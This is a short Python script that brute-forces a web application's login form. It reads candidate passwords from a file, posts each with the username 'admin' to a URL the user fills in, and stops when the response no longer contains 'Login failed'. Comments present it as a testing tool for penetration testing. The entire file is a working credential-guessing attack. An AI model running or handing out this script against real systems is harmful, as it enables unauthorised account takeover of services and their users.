import requests

# ENTER THESE VALUES AS NECESSARY
# Change url to the url to test
# Change username to username to test
# Change login button name to the correct value
# Change passwords list to whatever you need

url = ''
data = {'username': 'admin', 'password': '', 'Login': 'submit'}

with open('passwords.txt', 'r') as file:
    for line in file:
        password = line.rstrip()
        data['password'] = password
        webRequest = requests.post(url, data=data)
        print('Testing', password)

        if 'Login failed' not in webRequest.content:
            print('Password is', password)
            exit()

print('Password was not found')
